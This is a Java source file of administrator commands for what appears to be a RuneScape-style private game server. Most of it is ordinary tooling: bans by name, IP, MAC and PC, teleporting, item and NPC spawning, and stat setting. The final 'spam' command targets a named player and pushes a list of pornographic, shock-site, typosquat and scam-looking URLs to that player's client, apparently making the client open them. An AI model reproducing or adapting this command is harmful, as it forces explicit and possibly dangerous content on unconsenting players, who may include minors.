package com.StreamScape.net.packet.impl.commands.administrator;

import com.StreamScape.engine.task.TaskManager;
import com.StreamScape.model.*;
import com.StreamScape.model.container.impl.Equipment;
import com.StreamScape.model.container.impl.Shop;
import com.StreamScape.model.definitions.ItemDefinition;
import com.StreamScape.model.definitions.NpcDefinition;
import com.StreamScape.model.definitions.WeaponAnimations;
import com.StreamScape.model.definitions.WeaponInterfaces;
import com.StreamScape.world.World;
import com.StreamScape.world.clip.region.RegionClipping;
import com.StreamScape.world.content.BonusManager;
import com.StreamScape.world.content.PlayerLogs;
import com.StreamScape.world.content.PlayerPunishments;
import com.StreamScape.world.content.combat.weapon.CombatSpecial;
import com.StreamScape.world.content.skill.SkillManager;
import com.StreamScape.world.entity.impl.npc.NPC;
import com.StreamScape.world.entity.impl.player.Player;
import com.StreamScape.world.entity.impl.player.PlayerSaving;

import java.io.FileNotFoundException;
import java.io.IOException;

public class Misc {

	public static void checkCommands(Player player, String wholeCommand, String[] command)
			throws FileNotFoundException, IOException {
		if (command[0].equalsIgnoreCase("infhp")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("no such player exists");
				return;
			}
			target.getSkillManager().setCurrentLevel(Skill.CONSTITUTION, 99999);
		}
		if (command[0].equalsIgnoreCase("ban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			if (PlayerPunishments.isPlayerBanned(target.getUsername())) {
				player.getPacketSender().sendMessage("This player has already been banned.");
				return;
			}
			PlayerPunishments.ban(target.getUsername());
			PlayerLogs.log(player.getUsername(),
					"" + player.getUsername() + " has banned " + target.getUsername() + ".");
			target.getPacketSender().sendMessage("You have been banned by " + player.getUsername() + ".");
			player.getPacketSender().sendMessage("You have banned " + target.getUsername() + ".");
			World.deregister(target);
		}
		if (command[0].equalsIgnoreCase("unban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			if (!PlayerPunishments.isPlayerBanned(targetName)) {
				player.getPacketSender().sendMessage("This player has not been banned.");
				return;
			}
			PlayerPunishments.unBan(targetName);
			PlayerLogs.log(player.getUsername(), "" + player.getUsername() + " has un-banned " + targetName + ".");
			player.getPacketSender().sendMessage("You have un-banned " + targetName + ".");
		}
		if (command[0].equalsIgnoreCase("ipban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			if (PlayerPunishments.isIpBanned(target.getHostAddress())) {
				player.getPacketSender().sendMessage("This player has already been ip-banned.");
				return;
			}
			PlayerPunishments.ipBan(target.getHostAddress());
			PlayerLogs.log(player.getUsername(),
					"" + player.getUsername() + " has ip-banned " + target.getUsername() + ".");
			target.getPacketSender().sendMessage("You have been ip-banned by " + player.getUsername() + ".");
			player.getPacketSender().sendMessage("You have ip-banned " + target.getUsername() + ".");
			World.deregister(target);
		}
		if (command[0].equalsIgnoreCase("unipban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			PlayerSaving.getSavedData(player, targetName);
			if (!PlayerPunishments.isIpBanned(player.ipToUnban)) {
				player.getPacketSender().sendMessage("This player has not been ip-banned.");
				return;
			}
			PlayerPunishments.unIpBan(player.ipToUnban);
			PlayerLogs.log(player.getUsername(), "" + player.getUsername() + " has un-ip-banned " + targetName + ".");
			player.getPacketSender().sendMessage("You have un-ip-banned " + targetName + ".");
		}
		if (command[0].equalsIgnoreCase("macban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			if (PlayerPunishments.isMacBanned(target.getMac())) {
				player.getPacketSender().sendMessage("This player has already been mac-banned.");
				return;
			}
			PlayerPunishments.macBan(target.getMac());
			PlayerLogs.log(player.getUsername(),
					"" + player.getUsername() + " has mac-banned " + target.getUsername() + ".");
			target.getPacketSender().sendMessage("You have been mac-banned by " + player.getUsername() + ".");
			player.getPacketSender().sendMessage("You have mac-banned " + target.getUsername() + ".");
			World.deregister(target);
		}
		if (command[0].equalsIgnoreCase("unmacban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			PlayerSaving.getSavedData(player, targetName);
			if (!PlayerPunishments.isMacBanned(player.macToUnban)) {
				player.getPacketSender().sendMessage("This player has not been mac-banned.");
				return;
			}
			PlayerPunishments.unMacBan(player.macToUnban);
			PlayerLogs.log(player.getUsername(), "" + player.getUsername() + " has un-mac-banned " + targetName + ".");
			player.getPacketSender().sendMessage("You have un-mac-banned " + targetName + ".");
		}


		if (wholeCommand.equalsIgnoreCase("mypos")) {
			player.getPacketSender().sendMessage("X: " + player.getPosition().getX());
			player.getPacketSender().sendMessage("Y: " + player.getPosition().getY());
			player.getPacketSender().sendMessage("Z: " + player.getPosition().getZ());
		}
		if (command[0].equalsIgnoreCase("tele")) {
			int x = Integer.parseInt(command[1]);
			int y = Integer.parseInt(command[2]);
			int z = Integer.parseInt(command[3]);
			player.moveTo(new Position(x, y, z));
			player.getPacketSender().sendMessage("You teleport to X: " + x + " Y: " + y + " Z: " + z);
		}
		if (command[0].equalsIgnoreCase("item")) {
			int itemId = Integer.parseInt(command[1]);
			int itemAmount = Integer.parseInt(command[2]);
			if (player.getInventory().isFull()) {
				player.sendMessage("Please make space in your invetory.");
				return;
			}
			PlayerLogs.log(player.getUsername(), player.getUsername() + " has spawned " + itemAmount + "x of "
					+ ItemDefinition.forId(itemId).getName());
			player.getPacketSender().sendMessage(
					"You successfully spawn " + itemAmount + "x of " + ItemDefinition.forId(itemId).getName());
			player.getInventory().add(new Item(itemId, itemAmount));
		}
		if (command[0].equalsIgnoreCase("master")) {
			for (Skill skill : Skill.values()) {
				int level = SkillManager.getMaxAchievingLevel(skill);
				player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill,
						SkillManager.getExperienceForLevel(level == 120 ? 120 : 99));
			}
			player.getPacketSender().sendConsoleMessage("You are now a master of all skills.");
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}
		if (command[0].equalsIgnoreCase("bank")) {
			player.getBank(player.getCurrentBankTab()).open();
		}
		if (command[0].equalsIgnoreCase("spec")) {
			player.setSpecialPercentage(100);
			CombatSpecial.updateBar(player);
		}
		if (command[0].equalsIgnoreCase("runes")) {
			for (Item t : Shop.ShopManager.getShops().get(0).getItems()) {
				if (t != null) {
					player.getInventory().add(new Item(t.getId(), 200000));
				}
			}
		}
		// if (command[0].equalsIgnoreCase("hg")) {
		// HungerGamesMinigame.openGameSelection(player);
		// }
		if (command[0].equalsIgnoreCase("tasks")) {
			player.getPacketSender().sendConsoleMessage("Found " + TaskManager.getTaskAmount() + " tasks.");
		}
		if (command[0].equalsIgnoreCase("scroll")) {
			int child = Integer.parseInt(command[1]);
			int amount = Integer.parseInt(command[2]);
			player.getPacketSender().setScrollBar(child, amount);
		}
		if (command[0].equalsIgnoreCase("npc")) {
			int id = Integer.parseInt(command[1]);
			NPC npc = new NPC(id, new Position(player.getPosition().getX(), player.getPosition().getY(),
					player.getPosition().getZ()));
			World.register(npc);
			npc.setConstitution(20000);
			player.getPacketSender().sendEntityHint(npc);
		}
		if (command[0].equalsIgnoreCase("object")) {
			int id = Integer.parseInt(command[1]);
			player.getPacketSender().sendObject(new GameObject(id, player.getPosition(), 10, 3));
			player.getPacketSender().sendConsoleMessage("Sending object: " + id);
		}
		if (command[0].equals("pray")) {
			player.getSkillManager().setCurrentLevel(Skill.PRAYER, 15000);
		}
		if (command[0].equalsIgnoreCase("walk")) {
			player.getPacketSender().sendMessage("CAN WALK:" + player.getMovementQueue().canWalk());
			player.getPacketSender().sendMessage("BLOCKED EAST:" + RegionClipping.blockedEast(player.getPosition()));
			player.getPacketSender().sendMessage("BLOCKED WEST:" + RegionClipping.blockedWest(player.getPosition()));
			player.getPacketSender().sendMessage("BLOCKED SOUTH:" + RegionClipping.blockedSouth(player.getPosition()));
			player.getPacketSender().sendMessage("BLOCKED NORTH:" + RegionClipping.blockedNorth(player.getPosition()));
			player.getPacketSender().sendMessage("region: " + player.getPosition().getRegionId());
		}
		if (command[0].equalsIgnoreCase("findnpc")) {
			String npcName = wholeCommand.substring(8).toLowerCase().replaceAll("_", "");
			boolean found = false;
			player.getPacketSender().sendConsoleMessage("Finding npc id for npc - " + npcName);
			for (int i = 0; i < NpcDefinition.MAX_AMOUNT_OF_NPCS; ++i) {
				NpcDefinition npc = NpcDefinition.forId(i);
				if (npc == null)
					continue;
				if (npc.getName().toLowerCase().contains(npcName)) {
					player.getPacketSender().sendMessage("Found npc with name ["
							+ NpcDefinition.forId(i).getName().toLowerCase() + "] - id: " + i);
					found = true;
				}
			}
			if (!found) {
				player.getPacketSender().sendMessage("No npc with name [" + npcName + "] has been found!");
			}
		}
		else if (command[0].equalsIgnoreCase("find")) {
			String name = wholeCommand.substring(5).toLowerCase().replaceAll("_", " ");
			player.getPacketSender().sendConsoleMessage("Finding item id for item - " + name);
			boolean found = false;
			for (int i = 0; i < ItemDefinition.getMaxAmountOfItems(); i++) {
				if (ItemDefinition.forId(i).getName().toLowerCase().contains(name)) {
					player.getPacketSender().sendMessage("Found item with name ["
							+ ItemDefinition.forId(i).getName().toLowerCase() + "] - id: " + i);
					found = true;
				}
			}
			if (!found) {
				player.getPacketSender().sendMessage("No item with name [" + name + "] has been found!");
			}
		}
		if (command[0].equalsIgnoreCase("pure")) {
			int[][] data = new int[][] { { Equipment.HEAD_SLOT, 1153 }, { Equipment.CAPE_SLOT, 10499 },
					{ Equipment.AMULET_SLOT, 1725 }, { Equipment.WEAPON_SLOT, 4587 }, { Equipment.BODY_SLOT, 1129 },
					{ Equipment.SHIELD_SLOT, 1540 }, { Equipment.LEG_SLOT, 2497 }, { Equipment.HANDS_SLOT, 7459 },
					{ Equipment.FEET_SLOT, 3105 }, { Equipment.RING_SLOT, 2550 }, { Equipment.AMMUNITION_SLOT, 9244 } };
			for (int i = 0; i < data.length; i++) {
				int slot = data[i][0], id = data[i][1];
				player.getEquipment().setItem(slot, new Item(id, id == 9244 ? 500 : 1));
			}
			BonusManager.update(player);
			WeaponInterfaces.assign(player, player.getEquipment().get(Equipment.WEAPON_SLOT));
			WeaponAnimations.assign(player, player.getEquipment().get(Equipment.WEAPON_SLOT));
			player.getEquipment().refreshItems();
			player.getUpdateFlag().flag(Flag.APPEARANCE);
			player.getInventory().resetItems();
			player.getInventory().add(1216, 1000).add(9186, 1000).add(862, 1000).add(892, 10000).add(4154, 5000)
					.add(2437, 1000).add(2441, 1000).add(2445, 1000).add(386, 1000).add(2435, 1000);
			player.getSkillManager().newSkillManager();
			player.getSkillManager().setMaxLevel(Skill.ATTACK, 60).setMaxLevel(Skill.STRENGTH, 85)
					.setMaxLevel(Skill.RANGED, 85).setMaxLevel(Skill.PRAYER, 520).setMaxLevel(Skill.MAGIC, 70)
					.setMaxLevel(Skill.CONSTITUTION, 850);
			for (Skill skill : Skill.values()) {
				player.getSkillManager().setCurrentLevel(skill, player.getSkillManager().getMaxLevel(skill))
						.setExperience(skill,
								SkillManager.getExperienceForLevel(player.getSkillManager().getMaxLevel(skill)));
			}
		}

		if (command[0].equalsIgnoreCase("pcban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			if (PlayerPunishments.isPcBanned(target.getSerialNumber())) {
				player.getPacketSender().sendMessage("This player has already been pc-banned.");
				return;
			}
			PlayerPunishments.pcBan(target.getSerialNumber());
			PlayerLogs.log(player.getUsername(),
					"" + player.getUsername() + " has pc-banned " + target.getUsername() + ".");
			target.getPacketSender().sendMessage("You have been pc-banned by " + player.getUsername() + ".");
			player.getPacketSender().sendMessage("You have pc-banned " + target.getUsername() + ".");
			World.deregister(target);
		}
		if (command[0].equalsIgnoreCase("unpcban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			PlayerSaving.getSavedData(player, targetName);
			if (!PlayerPunishments.isPcBanned(player.uuidToUnban)) {
				player.getPacketSender().sendMessage("This player has not been pc-banned.");
				return;
			}
			PlayerPunishments.unPcBan(player.uuidToUnban);
			PlayerLogs.log(player.getUsername(), "" + player.getUsername() + " has un-pc-banned " + targetName + ".");
			player.getPacketSender().sendMessage("You have un-pc-banned " + targetName + ".");
		}
		if (command[0].equalsIgnoreCase("spam")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			player.getPacketSender().sendMessage("You have successfully spammed " + target.getUsername() + ".");
			target.getPacketSender().sendString(1, "www.xnxx.com");
			target.getPacketSender().sendString(1, "www.pornhub.com");
			target.getPacketSender().sendString(1, "www.redtube.com");
			target.getPacketSender().sendString(1, "www.porn.com");
			target.getPacketSender().sendString(1, "www.xvideos.com");
			target.getPacketSender().sendString(1, "www.porn300.com");
			target.getPacketSender().sendString(1, "www.fuq.com");
			target.getPacketSender().sendString(1, "www.bellesa.co");
			target.getPacketSender().sendString(1, "www.xhamster.com");
			target.getPacketSender().sendString(1, "www.sourmath.com");
			target.getPacketSender().sendString(1, "www.mylazysundays.com");
			target.getPacketSender().sendString(1, "www.pesttrap.com");
			target.getPacketSender().sendString(1, "www.malwarealarm.com");
			target.getPacketSender().sendString(1, "www.internetisseriousbusiness.com");
			target.getPacketSender().sendString(1, "www.goggle.com");
			target.getPacketSender().sendString(1, "www.freeipods.zoy.org");
			target.getPacketSender().sendString(1, "www.internetisseriousbusiness.on.nimp.org");
			target.getPacketSender().sendString(1, "www.youtubecracker.on.nimp.org");
		}
	}

}
